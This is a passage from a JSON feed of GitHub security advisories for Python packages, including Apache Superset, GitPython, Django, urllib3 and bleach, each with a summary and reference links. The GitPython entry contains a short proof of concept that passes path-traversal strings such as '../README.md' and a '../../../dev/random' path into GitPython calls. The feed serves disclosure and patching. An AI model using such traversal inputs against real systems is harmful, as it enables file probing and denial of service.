            "content_html": "<p>If an attacker gains write access to the Apache Superset metadata database, they could persist a specifically crafted Python object that may lead to remote code execution on Superset's web backend. This vulnerability impacts Apache Superset versions 1.5.0 up to and including 2.1.0.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-37941\">https://nvd.nist.gov/vuln/detail/CVE-2023-37941</a></li>\n<li><a href=\"https://lists.apache.org/thread/6qk1zscc06yogxxfgz2bh2bvz6vh9g7h\">https://lists.apache.org/thread/6qk1zscc06yogxxfgz2bh2bvz6vh9g7h</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fj4x-m62j-wvwg\">https://github.com/advisories/GHSA-fj4x-m62j-wvwg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fj4x-m62j-wvwg",
            "title": "[apache-superset] Apache Superset Deserialization of Untrusted Data vulnerability",
            "date_modified": "2023-09-08T12:18:54.000Z",
            "date_published": "2023-09-06T15:30:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fj4x-m62j-wvwg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Improper REST API permission in Apache Superset up to and including 2.1.0 allows for an authenticated Gamma users to test network connections, possible SSRF.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-36388\">https://nvd.nist.gov/vuln/detail/CVE-2023-36388</a></li>\n<li><a href=\"https://lists.apache.org/thread/ccmjjz4jp17yc2kcd18qshmdtf7qorfs\">https://lists.apache.org/thread/ccmjjz4jp17yc2kcd18qshmdtf7qorfs</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4fg9-5w46-xmrj\">https://github.com/advisories/GHSA-4fg9-5w46-xmrj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4fg9-5w46-xmrj",
            "title": "[apache-superset] Apache Superset Server Side Request Forgery vulnerability",
            "date_modified": "2023-09-08T12:18:25.000Z",
            "date_published": "2023-09-06T15:30:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4fg9-5w46-xmrj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>In order to resolve some git references, GitPython reads files from the <code>.git</code> directory, in some places the name of the file being read is provided by the user, GitPython doesn't check if this file is located outside the <code>.git</code> directory. This allows an attacker to make GitPython read any file from the system.</p>\n<h3 id=\"details\">Details</h3>\n<p>This vulnerability is present in</p>\n<p><a href=\"https://github.com/gitpython-developers/GitPython/blob/1c8310d7cae144f74a671cbe17e51f63a830adbf/git/refs/symbolic.py#L174-L175\">https://github.com/gitpython-developers/GitPython/blob/1c8310d7cae144f74a671cbe17e51f63a830adbf/git/refs/symbolic.py#L174-L175</a></p>\n<p>That code joins the base directory with a user given string without checking if the final path is located outside the base directory.</p>\n<p>I was able to exploit it from three places, but there may be more code paths that lead to it:</p>\n<p><a href=\"https://github.com/gitpython-developers/GitPython/blob/1c8310d7cae144f74a671cbe17e51f63a830adbf/git/repo/base.py#L605\">https://github.com/gitpython-developers/GitPython/blob/1c8310d7cae144f74a671cbe17e51f63a830adbf/git/repo/base.py#L605</a></p>\n<p><a href=\"https://github.com/gitpython-developers/GitPython/blob/1c8310d7cae144f74a671cbe17e51f63a830adbf/git/repo/base.py#L620\">https://github.com/gitpython-developers/GitPython/blob/1c8310d7cae144f74a671cbe17e51f63a830adbf/git/repo/base.py#L620</a></p>\n<p><a href=\"https://github.com/gitpython-developers/GitPython/blob/1c8310d7cae144f74a671cbe17e51f63a830adbf/git/index/base.py#L1353\">https://github.com/gitpython-developers/GitPython/blob/1c8310d7cae144f74a671cbe17e51f63a830adbf/git/index/base.py#L1353</a></p>\n<h3 id=\"poc\">PoC</h3>\n<p>Running GitPython within any repo should work, here is an example with the GitPython repo.</p>\n<pre><code class=\"language-python\">import git\n\nr = git.Repo(\".\")\n\n# This will make GitPython read the README.md file from the root of the repo\nr.commit(\"../README.md\")\nr.tree(\"../README.md\")\nr.index.diff(\"../README.md\")\n\n# Reading /etc/random\n# WARNING: this will probably halt your system, run with caution\n# r.commit(\"../../../../../../../../../dev/random\")\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>I wasn't able to show the contents of the files (that's why \"blind\" local file inclusion), depending on how GitPython is being used, this can be used by an attacker for something <em>inoffensive</em> as checking if a file exits, or cause a DoS by making GitPython read a big/infinite file (like <code>/dev/random</code> on Linux systems).</p>\n<h3 id=\"possible-solutions\">Possible solutions</h3>\n<p>A solution would be to check that the final path isn't located outside the <code>repodir</code> path (maybe even after resolving symlinks). Maybe there could be other checks in place to make sure that the reference names are valid.</p>\n<hr>\n<blockquote>\n<p>[!NOTE]\nThis vulnerability was reported via email, and it was decided to publish it here and make it public, so the community is aware of it, and a fix can be provided.</p>\n</blockquote>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-cwvm-v4w8-q58c\">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-cwvm-v4w8-q58c</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-41040\">https://nvd.nist.gov/vuln/detail/CVE-2023-41040</a></li>\n<li><a href=\"https://github.com/gitpython-developers/GitPython/blob/1c8310d7cae144f74a671cbe17e51f63a830adbf/git/refs/symbolic.py#L174-L175\">https://github.com/gitpython-developers/GitPython/blob/1c8310d7cae144f74a671cbe17e51f63a830adbf/git/refs/symbolic.py#L174-L175</a></li>\n<li><a href=\"https://github.com/gitpython-developers/GitPython/commit/74e55ee4544867e1bd976b7df5a45869ee397b0b\">https://github.com/gitpython-developers/GitPython/commit/74e55ee4544867e1bd976b7df5a45869ee397b0b</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/gitpython/PYSEC-2023-165.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/gitpython/PYSEC-2023-165.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cwvm-v4w8-q58c\">https://github.com/advisories/GHSA-cwvm-v4w8-q58c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cwvm-v4w8-q58c",
            "title": "[GitPython] Blind local file inclusion",
            "date_modified": "2023-09-07T21:32:03.000Z",
            "date_published": "2023-08-30T20:09:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cwvm-v4w8-q58c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Apache Airflow, versions before 2.6.3, is affected by a vulnerability that allows an unauthorized actor to gain access to sensitive information in Connection edit view. This vulnerability is considered low since it requires someone with access to Connection resources specifically updating the connection to exploit it. Users should upgrade to version 2.6.3 or later which has removed the vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-46651\">https://nvd.nist.gov/vuln/detail/CVE-2022-46651</a></li>\n<li><a href=\"https://github.com/apache/airflow/pull/32309\">https://github.com/apache/airflow/pull/32309</a></li>\n<li><a href=\"https://lists.apache.org/thread/n45h3y82og125rnlgt6rbm9szfb6q24d\">https://lists.apache.org/thread/n45h3y82og125rnlgt6rbm9szfb6q24d</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2023-103.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2023-103.yaml</a></li>\n<li><a href=\"https://github.com/apache/airflow/commit/d01248382fe45a5f5a7fdeed4082a80c5f814ad8\">https://github.com/apache/airflow/commit/d01248382fe45a5f5a7fdeed4082a80c5f814ad8</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xvw9-3mhm-xjqq\">https://github.com/advisories/GHSA-xvw9-3mhm-xjqq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xvw9-3mhm-xjqq",
            "title": "[apache-airflow] Apache Airflow information disclosure vulnerability",
            "date_modified": "2023-09-07T21:01:29.000Z",
            "date_published": "2023-07-12T12:31:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xvw9-3mhm-xjqq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Poetry prior to v1.1.9 was discovered to contain an untrusted search path which causes the application to behave in unexpected ways when users execute Poetry commands in a directory containing malicious content. This vulnerability occurs when the application is ran on Windows OS.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-26184\">https://nvd.nist.gov/vuln/detail/CVE-2022-26184</a></li>\n<li><a href=\"https://github.com/python-poetry/poetry-core/pull/205/commits/fa9cb6f358ae840885c700f954317f34838caba7\">https://github.com/python-poetry/poetry-core/pull/205/commits/fa9cb6f358ae840885c700f954317f34838caba7</a></li>\n<li><a href=\"https://github.com/python-poetry/poetry/releases/tag/1.1.9\">https://github.com/python-poetry/poetry/releases/tag/1.1.9</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/poetry/PYSEC-2022-234.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/poetry/PYSEC-2022-234.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xr2c-5w89-63pv\">https://github.com/advisories/GHSA-xr2c-5w89-63pv</a></li>\n<li><a href=\"https://github.com/python-poetry/poetry-core/commit/1e1a109a1009daaab2367ce90c997f0cbbb0c1d1\">https://github.com/python-poetry/poetry-core/commit/1e1a109a1009daaab2367ce90c997f0cbbb0c1d1</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xr2c-5w89-63pv",
            "title": "[poetry] Poetry before v1.1.9 contains Untrusted Search Path",
            "date_modified": "2023-09-07T20:59:29.000Z",
            "date_published": "2022-03-23T00:00:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xr2c-5w89-63pv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Django 3.1.x before 3.1.13 and 3.2.x before 3.2.5 allows QuerySet.order_by SQL injection if order_by is untrusted input from a client of a web application.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-35042\">https://nvd.nist.gov/vuln/detail/CVE-2021-35042</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/3.2/releases/security/\">https://docs.djangoproject.com/en/3.2/releases/security/</a></li>\n<li><a href=\"https://groups.google.com/forum/#!forum/django-announce\">https://groups.google.com/forum/#!forum/django-announce</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2021/jul/01/security-releases/\">https://www.djangoproject.com/weblog/2021/jul/01/security-releases/</a></li>\n<li><a href=\"https://www.openwall.com/lists/oss-security/2021/07/02/2\">https://www.openwall.com/lists/oss-security/2021/07/02/2</a></li>\n<li><a href=\"https://security.netapp.com/advisory/ntap-20210805-0008/\">https://security.netapp.com/advisory/ntap-20210805-0008/</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/SS6NJTBYWOX6J7G4U3LUOILARJKWPQ5Y/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/SS6NJTBYWOX6J7G4U3LUOILARJKWPQ5Y/</a></li>\n<li><a href=\"https://github.com/django/django/commit/0bd57a879a0d54920bb9038a732645fb917040e9\">https://github.com/django/django/commit/0bd57a879a0d54920bb9038a732645fb917040e9</a></li>\n<li><a href=\"https://github.com/django/django/commit/a34a5f724c5d5adb2109374ba3989ebb7b11f81f\">https://github.com/django/django/commit/a34a5f724c5d5adb2109374ba3989ebb7b11f81f</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xpfp-f569-q3p2\">https://github.com/advisories/GHSA-xpfp-f569-q3p2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xpfp-f569-q3p2",
            "title": "[Django] SQL Injection in Django",
            "date_modified": "2023-09-07T20:57:29.000Z",
            "date_published": "2021-09-22T17:34:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xpfp-f569-q3p2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>urllib3 before version 1.23 does not remove the Authorization HTTP header when following a cross-origin redirect (i.e., a redirect that differs in host, port, or scheme). This can allow for credentials in the Authorization header to be exposed to unintended hosts or transmitted in cleartext.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2018-20060\">https://nvd.nist.gov/vuln/detail/CVE-2018-20060</a></li>\n<li><a href=\"https://github.com/urllib3/urllib3/issues/1316\">https://github.com/urllib3/urllib3/issues/1316</a></li>\n<li><a href=\"https://github.com/urllib3/urllib3/pull/1346\">https://github.com/urllib3/urllib3/pull/1346</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2019:2272\">https://access.redhat.com/errata/RHSA-2019:2272</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=1649153\">https://bugzilla.redhat.com/show_bug.cgi?id=1649153</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-www2-v7xj-xrc6\">https://github.com/advisories/GHSA-www2-v7xj-xrc6</a></li>\n<li><a href=\"https://github.com/urllib3/urllib3/blob/master/CHANGES.rst\">https://github.com/urllib3/urllib3/blob/master/CHANGES.rst</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2021/06/msg00015.html\">https://lists.debian.org/debian-lts-announce/2021/06/msg00015.html</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/5SJERZEJDSUYQP7BNBXMBHRHGY26HRZD/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/5SJERZEJDSUYQP7BNBXMBHRHGY26HRZD/</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/BXLAXHM3Z6DUCXZ7ZXZ2EAYJXWDCZFCT/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/BXLAXHM3Z6DUCXZ7ZXZ2EAYJXWDCZFCT/</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XWP36YW3KSVLXDBY3QJKDYEPCIMN3VQZ/\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/XWP36YW3KSVLXDBY3QJKDYEPCIMN3VQZ/</a></li>\n<li><a href=\"https://usn.ubuntu.com/3990-1/\">https://usn.ubuntu.com/3990-1/</a></li>\n<li><a href=\"http://lists.opensuse.org/opensuse-security-announce/2019-09/msg00039.html\">http://lists.opensuse.org/opensuse-security-announce/2019-09/msg00039.html</a></li>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/560bd227b90f74417ffaedebf5f8d05a8ee4f532\">https://github.com/urllib3/urllib3/commit/560bd227b90f74417ffaedebf5f8d05a8ee4f532</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-www2-v7xj-xrc6",
            "title": "[urllib3] Exposure of Sensitive Information to an Unauthorized Actor in urllib3",
            "date_modified": "2023-09-07T20:53:30.000Z",
            "date_published": "2018-12-12T15:52:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-www2-v7xj-xrc6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Command Injection in Simiki v1.6.2.1 and prior allows remote attackers to execute arbitrary system commands via line 64 of the component 'simiki/blob/master/simiki/config.py'.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-19001\">https://nvd.nist.gov/vuln/detail/CVE-2020-19001</a></li>\n<li><a href=\"https://github.com/tankywoo/simiki/issues/123\">https://github.com/tankywoo/simiki/issues/123</a></li>\n<li><a href=\"https://github.com/tankywoo/simiki/commit/45da0ab7c1e94b368cac22867e7ac9a42dbb9390\">https://github.com/tankywoo/simiki/commit/45da0ab7c1e94b368cac22867e7ac9a42dbb9390</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w873-xcqq-x922\">https://github.com/advisories/GHSA-w873-xcqq-x922</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w873-xcqq-x922",
            "title": "[simiki] Command Injection in Simiki",
            "date_modified": "2023-09-07T20:49:29.000Z",
            "date_published": "2021-09-01T18:37:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w873-xcqq-x922"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Allegro Tech BigFlow prior to 1.6.0 is vulnerable to Missing SSL Certificate Validation.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-25392\">https://nvd.nist.gov/vuln/detail/CVE-2023-25392</a></li>\n<li><a href=\"https://github.com/allegro/bigflow/pull/357\">https://github.com/allegro/bigflow/pull/357</a></li>\n<li><a href=\"https://lutrasecurity.com/en/articles/cve-2023-25392/\">https://lutrasecurity.com/en/articles/cve-2023-25392/</a></li>\n<li><a href=\"https://github.com/allegro/bigflow/commit/4ce197ff99bd38693dea59ab5e9b781fbcef4276\">https://github.com/allegro/bigflow/commit/4ce197ff99bd38693dea59ab5e9b781fbcef4276</a></li>\n<li><a href=\"https://github.com/allegro/bigflow/commit/7e956661f76907594e8c82e8fb0af76dbea2a0fc\">https://github.com/allegro/bigflow/commit/7e956661f76907594e8c82e8fb0af76dbea2a0fc</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w6q2-48ch-fj26\">https://github.com/advisories/GHSA-w6q2-48ch-fj26</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w6q2-48ch-fj26",
            "title": "[bigflow] Allegro Tech BigFlow vulnerable to Missing SSL Certificate Validation",
            "date_modified": "2023-09-07T20:48:29.000Z",
            "date_published": "2023-04-10T15:30:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w6q2-48ch-fj26"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>When matrix-nio before 0.20 requests a room key from our devices, it correctly accepts key forwards only if they are a response to a previous request. However, it doesn't check that the device that responded matches the device the key was requested from.</p>\n<p>This allows a malicious homeserver to insert room keys of questionable validity into the key store in some situations, potentially assisting in an impersonation attack.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory, e-mail us at <a href=\"mailto:poljar@termina.org.uk\">poljar@termina.org.uk</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/poljar/matrix-nio/security/advisories/GHSA-w4pr-4vjg-hffh\">https://github.com/poljar/matrix-nio/security/advisories/GHSA-w4pr-4vjg-hffh</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-39254\">https://nvd.nist.gov/vuln/detail/CVE-2022-39254</a></li>\n<li><a href=\"https://github.com/poljar/matrix-nio/commit/b1cbf234a831daa160673defd596e6450e9c29f0\">https://github.com/poljar/matrix-nio/commit/b1cbf234a831daa160673defd596e6450e9c29f0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w4pr-4vjg-hffh\">https://github.com/advisories/GHSA-w4pr-4vjg-hffh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w4pr-4vjg-hffh",
            "title": "[matrix-nio] When matrix-nio receives forwarded room keys, the receiver doesn't check if it requested the key from the forwarder",
            "date_modified": "2023-09-07T20:46:29.000Z",
            "date_published": "2022-09-30T22:56:17.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w4pr-4vjg-hffh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A <a href=\"https://cure53.de/fp170.pdf\">mutation XSS</a> affects users calling <code>bleach.clean</code> with all of:</p>\n<ul>\n<li><code>svg</code> or <code>math</code> in the allowed tags</li>\n<li><code>p</code> or <code>br</code> in allowed tags</li>\n<li><code>style</code>, <code>title</code>, <code>noscript</code>, <code>script</code>, <code>textarea</code>, <code>noframes</code>, <code>iframe</code>, or <code>xmp</code> in allowed tags</li>\n<li>the keyword argument <code>strip_comments=False</code></li>\n</ul>\n<p>Note: none of the above tags are in the default allowed tags and <code>strip_comments</code> defaults to <code>True</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users are encouraged to upgrade to bleach v3.3.0 or greater.</p>\n<p>Note: bleach v3.3.0 introduces a breaking change to escape HTML comments by default.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<ul>\n<li><p>modify <code>bleach.clean</code> calls to at least one of:</p>\n<ul>\n<li>not allow the <code>style</code>, <code>title</code>, <code>noscript</code>, <code>script</code>, <code>textarea</code>, <code>noframes</code>, <code>iframe</code>, or <code>xmp</code> tag</li>\n<li>not allow <code>svg</code> or <code>math</code> tags</li>\n<li>not allow <code>p</code> or <code>br</code> tags</li>\n<li>set <code>strip_comments=True</code></li>\n</ul>\n</li>\n<li><p>A strong <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP\">Content-Security-Policy</a> without <code>unsafe-inline</code> and <code>unsafe-eval</code> <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src\"><code>script-src</code>s</a>) will also help mitigate the risk.</p>\n</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=1689399\">https://bugzilla.mozilla.org/show_bug.cgi?id=1689399</a></li>\n<li><a href=\"https://advisory.checkmarx.net/advisory/CX-2021-4303\">https://advisory.checkmarx.net/advisory/CX-2021-4303</a></li>\n<li><a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23980\">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23980</a></li>\n<li><a href=\"https://cure53.de/fp170.pdf\">https://cure53.de/fp170.pdf</a></li>\n</ul>\n<h3 id=\"credits\">Credits</h3>\n<ul>\n<li>Reported by <a href=\"https://twitter.com/ynizry\">Yaniv Nizry</a> from the CxSCA AppSec group at Checkmarx</li>\n<li>Additional eject tags not mentioned in the original advisory and the CSP mitigation line being truncated in the revised advisory reported by <a href=\"https://twitter.com/SecurityMB\">Michał Bentkowski</a> at Securitum</li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Open an issue at <a href=\"https://github.com/mozilla/bleach/issues\">https://github.com/mozilla/bleach/issues</a></li>\n<li>Email us at <a href=\"mailto:security@mozilla.org\">security@mozilla.org</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mozilla/bleach/security/advisories/GHSA-vv2x-vrpj-qqpq\">https://github.com/mozilla/bleach/security/advisories/GHSA-vv2x-vrpj-qqpq</a></li>\n<li><a href=\"https://github.com/mozilla/bleach/commit/79b7a3c5e56a09d1d323a5006afa59b56162eb13\">https://github.com/mozilla/bleach/commit/79b7a3c5e56a09d1d323a5006afa59b56162eb13</a></li>\n<li><a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=1689399\">https://bugzilla.mozilla.org/show_bug.cgi?id=1689399</a></li>\n<li><a href=\"https://cure53.de/fp170.pdf\">https://cure53.de/fp170.pdf</a></li>\n<li><a href=\"https://github.com/mozilla/bleach/blob/79b7a3c5e56a09d1d323a5006afa59b56162eb13/CHANGES#L4\">https://github.com/mozilla/bleach/blob/79b7a3c5e56a09d1d323a5006afa59b56162eb13/CHANGES#L4</a></li>\n<li><a href=\"https://pypi.org/project/bleach/\">https://pypi.org/project/bleach/</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-23980\">https://nvd.nist.gov/vuln/detail/CVE-2021-23980</a></li>\n<li><a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=CVE-2021-23980\">https://bugzilla.mozilla.org/show_bug.cgi?id=CVE-2021-23980</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vv2x-vrpj-qqpq\">https://github.com/advisories/GHSA-vv2x-vrpj-qqpq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vv2x-vrpj-qqpq",
            "title": "[bleach] Cross-site scripting in Bleach",
            "date_modified": "2023-09-07T20:44:31.000Z",
            "date_published": "2021-02-02T17:58:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vv2x-vrpj-qqpq"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}